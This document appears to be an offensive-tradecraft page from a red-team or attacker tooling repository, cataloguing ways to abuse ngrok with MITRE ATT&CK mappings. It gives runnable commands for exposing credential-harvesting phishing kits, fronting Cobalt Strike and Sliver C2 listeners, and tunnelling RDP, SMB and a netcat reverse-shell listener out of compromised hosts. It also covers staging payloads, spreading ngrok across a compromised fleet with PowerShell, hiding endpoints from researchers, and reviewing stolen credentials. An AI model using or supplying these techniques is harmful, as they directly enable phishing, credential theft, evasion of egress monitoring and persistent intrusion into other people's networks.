# ngrok — Hands-On Use Cases

Every scenario below expands an entry from `01 - Overview.md`'s Quick Use-Case List, with a full command and its MITRE ATT&CK ID(s). MITRE tracks ngrok as its own Software entry, [S0508](https://attack.mitre.org/software/S0508/), mapping it directly to T1568.002, T1567, T1572, T1090, and T1102 — those five are cited by exact ID throughout below rather than re-derived per use case.

## Contents
- [Exposing a Local Phishing Kit](#exposing-a-local-phishing-kit)
- [HTTP(S) Callback Front for a C2 Framework Listener](#https-callback-front-for-a-c2-framework-listener)
- [TCP Tunnel Exposing RDP](#tcp-tunnel-exposing-rdp)
- [TCP Tunnel Exposing SMB for Lateral-Movement Tooling](#tcp-tunnel-exposing-smb-for-lateral-movement-tooling)
- [TCP Tunnel Fronting a Raw Reverse-Shell Listener](#tcp-tunnel-fronting-a-raw-reverse-shell-listener)
- [Persistent Callback Domain via a Reserved or Free Static Domain](#persistent-callback-domain-via-a-reserved-or-free-static-domain)
- [TLS Tunnel for a Custom C2 Protocol](#tls-tunnel-for-a-custom-c2-protocol)
- [Local Directory as a Payload-Staging Server](#local-directory-as-a-payload-staging-server)
- [Chained Workflow: Fronting a Cobalt Strike Beacon Listener](#chained-workflow-fronting-a-cobalt-strike-beacon-listener)
- [Chained Workflow: Fronting a Sliver HTTPS Listener](#chained-workflow-fronting-a-sliver-https-listener)
- [Fleet-Wide Deployment as Redundant Per-Host Channels](#fleet-wide-deployment-as-redundant-per-host-channels)
- [Gating an Exposed Endpoint with Basic Auth](#gating-an-exposed-endpoint-with-basic-auth)
- [Installing as a Persistent Background Service](#installing-as-a-persistent-background-service)
- [Reviewing Captured Phishing Traffic via the Local Inspection UI](#reviewing-captured-phishing-traffic-via-the-local-inspection-ui)

---

## Exposing a Local Phishing Kit

**MITRE ATT&CK:** T1583.006 (Acquire Infrastructure: Web Services), T1566.002 (Phishing: Spearphishing Link)

```bash
# Serve a local credential-harvesting page on port 8080, expose it publicly
ngrok http 8080
```

The operator stands up a phishing kit (e.g. an Evilginx or gophish page) on `localhost:8080` and gets back a public `https://<random>.ngrok-free.app` URL with zero server-hosting, DNS registration, or SSL-certificate provisioning of their own — ngrok's edge already terminates valid TLS on the `*.ngrok-free.app` cert chain. The link goes out in the phishing email/message; the target's browser never sees anything resembling attacker-owned infrastructure.

## HTTP(S) Callback Front for a C2 Framework Listener

**MITRE ATT&CK:** T1102 (Web Service), T1102.002 (Bidirectional Communication), T1572 (Protocol Tunneling)

```bash
# Front an already-running HTTP(S) listener on the operator's own machine
ngrok http 443
```

MITRE's own S0508 entry names this pattern directly: "proxies C2 connections to ngrok service subdomains." An implant's callback traffic to `<random>.ngrok-free.app` looks, from the target network's egress perspective, like any other HTTPS session to a well-known SaaS-style domain — the C2 framework's own listener (Cobalt Strike's Team Server, Sliver's HTTP(S) C2, `Cobalt Strike/` and `Sliver/` in this repo) never has to be directly internet-reachable at all.

## TCP Tunnel Exposing RDP

**MITRE ATT&CK:** T1021.001 (Remote Services: Remote Desktop Protocol), T1572 (Protocol Tunneling), T1090 (Proxy)

```bash
# Run ON the already-compromised host, exposing its own local RDP service (3389)
ngrok tcp 3389
```

Returns a random `tcp://N.tcp.ngrok.io:PORT` address. The operator connects their own RDP client to that address instead of `3389` directly — functionally the same outcome as `AnyDesk/`'s remote-desktop access use case, but riding ngrok's tunnel instead of a dedicated RMM client, and without ever needing 3389 forwarded through the target network's actual firewall/NAT.

## TCP Tunnel Exposing SMB for Lateral-Movement Tooling

**MITRE ATT&CK:** T1021.002 (Remote Services: SMB/Windows Admin Shares), T1572, T1090

```bash
ngrok tcp 445
```

Makes port 445 on the compromised host reachable at a `tcp://N.tcp.ngrok.io:PORT` address from anywhere the operator is, letting Impacket's `psexec`/`wmiexec`/`secretsdump` (`Impacket/`, already built in this repo) or Sysinternals `PsExec/` be run against the tunneled address as if the operator were on the same network segment — useful when the operator's own foothold/jump-box loses direct network reachability to the target segment but the target itself still has outbound internet access.

## TCP Tunnel Fronting a Raw Reverse-Shell Listener

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol: Web Protocols — for the control channel itself), T1090

```bash
# On the operator's own listener host
nc -lvnp 4444
ngrok tcp 4444
```

The simplest possible pairing: a bare `netcat` listener (`LOLBins/netcat/`, already built) gets an ngrok-assigned public TCP address, and the payload on the target connects out to that address instead of a raw IP:port the operator would otherwise have to expose directly on their own infrastructure's firewall.

## Persistent Callback Domain via a Reserved or Free Static Domain

**MITRE ATT&CK:** T1583.006 (Acquire Infrastructure: Web Services), T1071.001 (Application Layer Protocol: Web Protocols)

```bash
# Free-tier: the account's one assigned static dev domain persists automatically
ngrok http 8080 --url https://panda-new-kit.ngrok-free.app

# Paid tier: a previously reserved domain, bound explicitly
ngrok http 8080 --url https://c2.example-reserved.ngrok.app
```

Per `01 - Overview.md`'s domain-tier table, this is the counter-intuitive persistence lever: a **free** account's static dev domain never changes across agent restarts with no payment required at all, while getting a genuinely **new random** domain every run — the more commonly assumed "evasive" default — now requires a paid plan. An operator building durable, hardcoded implant callback infrastructure has every reason to prefer the free static domain or a paid reserved one over ngrok's ephemeral-random mode.

## TLS Tunnel for a Custom C2 Protocol

**MITRE ATT&CK:** T1572 (Protocol Tunneling), T1071 (Application Layer Protocol)

```bash
ngrok tls 4444
```

For an implant that speaks its own TLS-wrapped protocol rather than HTTP (e.g. a custom Mythic C2 profile, a Metasploit `reverse_https` variant tuned to a nonstandard wire format), `ngrok tls` gets TLS termination and a public address without the HTTP-specific request/response inspection and rewriting that `ngrok http` applies — the raw TLS stream passes through untouched after the handshake.

## Local Directory as a Payload-Staging Server

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer), T1583.006 (Acquire Infrastructure: Web Services)

```bash
ngrok http "file:///tmp/payloads"
```

Turns a local folder into a public, directory-listing-capable HTTP file server with a single command — no separate web server (`python3 -m http.server`, IIS, nginx) needs to be stood up or exposed on its own. A target host's `certutil`/`curl`/`Invoke-WebRequest` pulls the second-stage payload directly from the ngrok-fronted URL (`LOLBins/certutil/` and `LOLBins/powershell/`, already built, cover the target-side download-and-execute mechanics).

## Chained Workflow: Fronting a Cobalt Strike Beacon Listener

**MITRE ATT&CK:** T1572, T1102.002, T1090.002 (Proxy: External Proxy)

```bash
# On the Cobalt Strike Team Server host, once a Beacon HTTP(S) listener is running locally
ngrok http 443 --url https://c2.example-reserved.ngrok.app
```

Beacon's Malleable C2 profile (`Cobalt Strike/`, already built) still fully controls the HTTP request/response shape seen by the target; ngrok simply relocates *where* that traffic terminates from a directly-exposed Team Server IP to an ngrok domain, adding one more egress-filtering-bypass layer on top of whatever Malleable-profile customization is already in play. A reserved domain (previous use case) keeps that front consistent across Team Server restarts.

## Chained Workflow: Fronting a Sliver HTTPS Listener

**MITRE ATT&CK:** T1572, T1102.002, T1090.002

```bash
# On the Sliver server host, once an HTTPS C2 listener is running locally
ngrok http 8443
```

Same pattern as the Cobalt Strike case, applied to Sliver's own HTTP(S) C2 listener (`Sliver/`, already built) — ngrok is protocol-agnostic to whatever HTTP(S) traffic the framework itself generates, so this works identically regardless of which framework is behind it.

## Fleet-Wide Deployment as Redundant Per-Host Channels

**MITRE ATT&CK:** T1583.006, T1090.002, T1570 (Lateral Tool Transfer, for the deployment step itself)

```powershell
foreach ($h in Get-Content .\hosts.txt) {
  Copy-Item .\ngrok.exe "\\$h\C$\Windows\Temp\ngrok.exe"
  Invoke-Command -ComputerName $h -ScriptBlock {
    C:\Windows\Temp\ngrok.exe config add-authtoken <shared-or-per-host-authtoken>
    C:\Windows\Temp\ngrok.exe tcp 3389
  }
}
```

Mirrors `AnyDesk/`'s fleet-wide redundant-access use case: standing up an independent ngrok tunnel on multiple already-compromised hosts as a backup channel that survives the loss of a primary implant, without depending on a single shared C2 infrastructure endpoint being reachable from every host.

## Gating an Exposed Endpoint with Basic Auth

**MITRE ATT&CK:** T1090 (Proxy) — defensive-evasion angle against third-party discovery, not against the target organization

```bash
ngrok http 8080 --basic-auth "opuser:S0meLongP@ss2026"
```

ngrok's public domain space (`*.ngrok.io`, `*.ngrok-free.app`) is well known and actively scanned by security researchers and automated crawlers looking for exposed dev services and misconfigured tunnels. Gating the endpoint behind Basic Auth keeps a phishing page or staged payload from being stumbled onto (and potentially reported/taken down) by someone other than the intended target before the operation is done.

## Installing as a Persistent Background Service

**MITRE ATT&CK:** T1543.003 (Create or Modify System Process: Windows Service)

```powershell
ngrok.exe config add-authtoken <token>
ngrok.exe service install --config C:\Windows\Temp\ngrok.yml
ngrok.exe service start
```

Registers the agent as a genuine Windows service (systemd unit on Linux, launchd job on macOS), so a tunnel defined in `ngrok.yml` comes back up automatically after a reboot with no foreground terminal session or logged-in user required — the same persistence value proposition as AnyDesk's installed mode (`AnyDesk/01 - Overview.md`'s portable-vs-installed table), applied to ngrok.

## Reviewing Captured Phishing Traffic via the Local Inspection UI

**No discrete MITRE ATT&CK ID** — this is operator tradecraft on top of the phishing use case above, not a separate technique.

```bash
# With an HTTP tunnel already running, browse locally on the operator's own machine:
# http://127.0.0.1:4040
```

Every request that hits the phishing-kit tunnel — including submitted credentials in POST bodies, source IPs, and User-Agent strings — is visible in real time in the local inspection UI, with a one-click **Replay** to resend a captured request. No separate log-tailing or credential-harvesting backend is needed; ngrok's own request-capture feature does that job for the operator (`03 - Source Evidence.md` covers what this leaves behind locally).
